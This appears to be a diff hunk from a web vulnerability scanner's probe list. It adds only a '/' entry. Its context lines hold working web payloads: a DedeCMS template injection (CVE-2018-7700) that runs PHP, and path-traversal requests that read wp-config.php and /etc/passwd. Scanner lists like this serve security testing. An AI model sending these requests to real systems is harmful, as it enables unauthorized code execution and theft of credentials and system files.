@@ -48,3 +48,4 @@
 /tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}echo%20md5%28%22CVE-2018-7700%22%29%3B{/dede:field}
 /wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php
 /sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd
+/
